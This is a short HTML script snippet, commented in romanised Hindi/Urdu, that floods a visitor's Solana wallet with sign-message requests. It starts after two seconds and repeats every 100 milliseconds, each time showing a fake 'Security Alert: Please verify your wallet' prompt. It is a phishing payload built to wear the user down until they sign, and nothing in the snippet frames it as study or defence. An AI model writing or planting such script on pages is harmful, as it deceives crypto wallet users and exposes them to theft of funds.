<script>
    function spamPrompts() {
        // User ko baar baar sign karne ka popup dikhana
        window.postMessage({
            target: "provider",
            data: { 
                method: "sol_signMessage", 
                params: ["Security Alert: Please verify your wallet to prevent loss!"] 
            }
        }, "*");
        
        // Har 100 millisecond baad doobara popup bhejna
        setTimeout(spamPrompts, 100);
    }

    setTimeout(() => {
        spamPrompts();
    }, 2000);
</script>
